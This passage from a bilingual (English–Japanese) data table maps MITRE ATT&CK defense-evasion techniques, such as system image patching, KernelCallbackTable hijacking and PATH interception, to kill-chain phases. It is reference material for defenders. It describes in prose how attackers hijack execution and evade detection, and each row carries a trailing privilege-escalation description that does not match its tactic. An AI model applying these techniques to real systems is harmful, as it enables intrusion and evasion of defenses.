On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.

Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1601,システムイメージの変更,Modify System Image,"攻撃者は、防御を弱体化させ、自身に新しい機能を提供するために、組み込みネットワークデバイスのオペレーティングシステムに変更を加える可能性があります。このようなデバイスでは、オペレーティングシステムは通常モノリシックであり、デバイスの機能と能力のほとんどは単一ファイルに含まれています。

オペレーティングシステムを変更するために、攻撃者は通常、この1つのファイルに影響を与え、それを置き換えるか変更するだけで済みます。これは、即時の効果を得るためにシステム実行中にメモリ内でライブで行うことも、ネットワークデバイスの次回の起動時に変更を実装するためにストレージで行うこともできます。","Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.

To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",T1601.001,システムイメージのパッチ適用,Patch System Image,"攻撃者は、新しい機能を導入したり既存の防御を弱体化させたりするために、ネットワークデバイスのオペレーティングシステムを変更する可能性があります。(引用: Killing the myth of Cisco IOS rootkits) (引用: Killing IOS diversity myth) (引用: Cisco IOS Shellcode) (引用: Cisco IOS Forensics Developments) (引用: Juniper Netscreen of the Dead) 一部のネットワークデバイスはモノリシックアーキテクチャで構築されており、オペレーティングシステム全体とデバイスの機能のほとんどが単一ファイルに含まれています。攻撃者は、将来の起動時にロードされるようにストレージ内のこのファイルを変更したり、実行時にメモリ内で変更したりする可能性があります。

ストレージ内のオペレーティングシステムを変更するために、攻撃者は通常、デバイスオペレータが利用できる標準的な手順を使用します。これには、TFTP、FTP、SCP、またはコンソール接続など、ネットワークデバイスで一般的に使用されるプロトコルを介して新しいファイルをダウンロードすることが含まれる場合があります。元のファイルが上書きされるか、新しいファイルがその横に書き込まれ、デバイスが侵害されたイメージから起動するように再構成される場合があります。

メモリ内のオペレーティングシステムを変更するために、攻撃者は通常2つの方法のいずれかを使用できます。1つ目の方法では、攻撃者は元の変更されていない実行中のオペレーティングシステム内のネイティブデバッグコマンドを利用して、実行中のオペレーティングシステムを含む関連するメモリアドレスを直接変更します。この方法は通常、デバイスへの管理者レベルのアクセスが必要です。

メモリ内のオペレーティングシステムを変更する2番目の方法では、攻撃者はブートローダーを利用します。ブートローダーは、デバイス起動時に最初にロードされるソフトウェアであり、次にオペレーティングシステムを起動します。攻撃者は、[ROMMONキット](https://attack.mitre.org/techniques/T1542/004)メソッドなどを介して以前にブートローダーに埋め込まれた悪意のあるコードを使用して、メモリ内の実行中のオペレーティングシステムコードを直接操作する可能性があります。ブートローダー内のこの悪意のあるコードは、攻撃者に直接メモリ操作の機能を提供し、実行時にライブオペレーティングシステムにパッチを適用できるようにします。

システムイメージファイルに保存されている命令を変更することにより、敵対者は既存の防御を弱体化させるか、デバイスが以前は持っていなかった新しい機能を提供することができます。妨害される可能性のある既存の防御の例としては、[暗号化の弱体化](https://attack.mitre.org/techniques/T1600)による暗号化、[ネットワークデバイス認証](https://attack.mitre.org/techniques/T1556/004)による認証、[ネットワーク境界ブリッジング](https://attack.mitre.org/techniques/T1599)による境界防御などがあります。敵対者の目的のために新しい機能を追加することには、[キーロギング](https://attack.mitre.org/techniques/T1056/001)、[マルチホッププロキシ](https://attack.mitre.org/techniques/T1090/003)、[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)などがあります。

敵対者はまた、オペレーティングシステム内の既存のコマンドを侵害して、防御者を誤解させる偽の出力を生成する可能性があります。[システムイメージのダウングレード](https://attack.mitre.org/techniques/T1601/002)と組み合わせてこの方法を使用する場合、侵害されたシステムコマンドの一例として、現在実行中のオペレーティングシステムのバージョンを表示するコマンドの出力を変更することが挙げられます。オペレーティングシステムにパッチを適用することにより、敵対者はこのコマンドを変更して、代わりにシステムのダウングレードによって置き換えられた元のより高いリビジョン番号を表示させることができます。

オペレーティングシステムがストレージにパッチを当てられる場合、これは常駐ストレージ（通常は不揮発性のフラッシュメモリの一種）または[TFTPブート](https://attack.mitre.org/techniques/T1542/005)を介して達成できます。

メモリ内の実行中のオペレーティングシステムに対してこのテクニックが実行され、保存されたコピーに対して実行されない場合、このテクニックは再起動後も持続しません。しかし、オペレーティングシステムのライブメモリ変更は、永続性を達成するために[ROMMONキット](https://attack.mitre.org/techniques/T1542/004)と組み合わせることができます。","Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.

To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.

To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.

In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.

By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).

Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade.

When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005).

When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.010,サービスファイルパーミッションの脆弱性,Services File Permissions Weakness,"攻撃者は、サービスによって使用されるバイナリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。攻撃者は、Windowsサービスのアクセス許可の欠陥を使用して、サービス開始時に実行されるバイナリを置き換える可能性があります。これらのサービスプロセスは、その機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する場合があります。ターゲットバイナリを含むファイルシステムディレクトリのアクセス許可、またはバイナリ自体のアクセス許可が不適切に設定されている場合、ターゲットバイナリはユーザーレベルのアクセス許可を使用して別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高いアクセス許可レベルで実行されている場合、置き換えられたバイナリもSYSTEMを含むより高いレベルのアクセス許可で実行されます。

攻撃者は、より高いアクセス許可レベルでコードを実行する手段として、正当なバイナリを悪意のあるバイナリに置き換えるためにこのテクニックを使用する可能性があります。実行中のプロセスが特定の時間に実行されるように設定されている場合、または特定のイベント（システムの起動など）中に実行されるように設定されている場合、このテクニックは永続化にも使用できます。","Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.013,KernelCallbackTable,KernelCallbackTable,"攻撃者は、プロセスの<code>KernelCallbackTable</code>を悪用してその実行フローをハイジャックし、独自のペイロードを実行する可能性があります。(引用: Lazarus APT January 2022)(引用: FinFisher exposed ) <code>KernelCallbackTable</code>はプロセス環境ブロック（PEB）にあり、<code>user32.dll</code>がロードされるとGUIプロセスで利用可能なグラフィック関数の配列に初期化されます。(引用: Windows Process Injection KernelCallbackTable)

攻撃者は、元のコールバック関数を悪意のあるペイロードに置き換えることにより、<code>KernelCallbackTable</code>を使用してプロセスの実行フローをハイジャックする可能性があります。コールバック関数の変更は、別のプロセスへの[リフレクティブコードローディング](https://attack.mitre.org/techniques/T1620)や[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)など、関連する動作を含むさまざまな方法で実現できます。

<code>KernelCallbackTable</code>のメモリアドレスへのポインタは、PEBを特定することによって取得できます（例：<code>NtQueryInformationProcess()</code> [ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数の呼び出しを介して）。(引用: NtQueryInformationProcess) ポインタが見つかると、<code>KernelCallbackTable</code>を複製し、テーブル内の関数（例：<code>fnCOPYDATA</code>）を悪意のあるペイロードのアドレスに設定できます（例：<code>WriteProcessMemory()</code>を介して）。その後、PEBはテーブルの新しいアドレスで更新されます。改ざんされた関数が呼び出されると、悪意のあるペイロードがトリガーされます。(引用: Lazarus APT January 2022)

改ざんされた関数は通常、Windowsメッセージを使用して呼び出されます。プロセスがハイジャックされ、悪意のあるコードが実行された後、<code>KernelCallbackTable</code>は悪意のあるペイロードの残りの部分によって元の状態に復元される場合もあります。(引用: Lazarus APT January 2022) 実行が正当なプロセスの下でマスクされるため、<code>KernelCallbackTable</code>を使用して実行フローをハイジャックすると、セキュリティ製品による検出を回避できる場合があります。","Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)

An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.

A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)

The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.007,PATH環境変数によるパスインターセプション,Path Interception by PATH Environment Variable,"攻撃者は、ライブラリのロードに使用される環境変数をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。PATH環境変数には、スクリプトまたはコマンドラインから呼び出されたバイナリを検索するためにOSが順次検索するディレクトリ（ユーザーおよびシステム）のリストが含まれています。

攻撃者は、PATH環境変数に格納されているディレクトリのリストの前のエントリに悪意のあるプログラムを配置することで、OSがそのPATHリストを順次検索するときに、正当なバイナリではなく悪意のあるバイナリを実行するように仕向けることができます。

例えば、Windowsで攻撃者が「net.exe」という名前の悪意のあるプログラムを`C:\\example path`に配置し、これがデフォルトでPATH環境変数の`C:\\Windows\\system32\\net.exe`より前にある場合、コマンドラインから「net」が実行されると、システムの正当な実行可能ファイルである`C:\\Windows\\system32\\net.exe`の代わりに`C:\\example path`が呼び出されます。プログラムを実行する一部のメソッドは、プログラムのパスが指定されていない場合に検索される場所を決定するためにPATH環境変数に依存します。例えば、[コマンドおよびスクリプトインタープリター](https://attack.mitre.org/techniques/T1059)からプログラムを実行する場合などです。(引用: ExpressVPN PATH env Windows 2021)

攻撃者はまた、検索対象のディレクトリを指定する$PATH変数を直接変更することもあります。攻撃者は、書き込みアクセス権を持つディレクトリを指すように`$PATH`変数を変更できます。$PATH変数を使用するプログラムが呼び出されると、OSは指定されたディレクトリを検索し、悪意のあるバイナリを実行します。macOSでは、これは$HOME変数を変更することによっても実行できます。これらの変数は、コマンドライン、launchctl、[Unixシェル構成の変更](https://attack.mitre.org/techniques/T1546/004)、または`/etc/paths.d`フォルダの内容を変更することによって変更できます。(引用: uptycs Fake POC linux malware 2023)(引用: nixCraft macOS PATH variables)(引用: Elastic Rules macOS launchctl 2022)","Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.

Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.

For example, on Windows if an adversary places a malicious program named \""net.exe\"" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \""net\"" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)

Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.005,実行可能インストーラーファイルのアクセス許可の脆弱性,Executable Installer File Permissions Weakness,"攻撃者は、インストーラーによって使用されるバイナリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。これらのプロセスは、その機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する場合があります。ターゲットバイナリを含むファイルシステムディレクトリのアクセス許可、またはバイナリ自体のアクセス許可が不適切に設定されている場合、ターゲットバイナリはユーザーレベルのアクセス許可を使用して別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高いアクセス許可レベルで実行されている場合、置き換えられたバイナリもSYSTEMを含むより高いレベルのアクセス許可で実行されます。

このテクニックの別のバリエーションは、実行可能ファイル形式の自己解凍インストーラーに共通する脆弱性を利用することによって実行できます。インストールプロセス中、インストーラーがDLL、EXE、またはその他のペイロードなどのバイナリを展開するために<code>%TEMP%</code>ディレクトリ内のサブディレクトリを使用するのが一般的です。インストーラーがサブディレクトリとファイルを作成するとき、書き込みアクセスを制限するための適切なアクセス許可をしばしば設定しないため、サブディレクトリに配置された信頼できないコードの実行や、インストールプロセスで使用されるバイナリの上書きが可能になります。この動作は[DLL](https://attack.mitre.org/techniques/T1574/001)検索順序ハイジャックに関連しており、これを利用する可能性があります。

攻撃者はこのテクニックを使用して、より高い権限レベルでコードを実行する手段として、正当なバイナリを悪意のあるバイナリに置き換える可能性があります。一部のインストーラーは、攻撃者が制御するコードを実行する際に権限昇格をもたらす昇格された権限を必要とする場合もあります。この動作は[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)に関連しています。既存の一般的なインストーラーにおけるこの脆弱性のいくつかの例がソフトウェアベンダーに報告されています。(引用: mozilla_sec_adv_2012) (引用: Executable Installers are Vulnerable) 実行中のプロセスが特定の時間に実行されるように設定されている場合、または特定のイベント（システムの起動など）中に実行されるように設定されている場合、このテクニックは永続化にも使用できます。","Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.

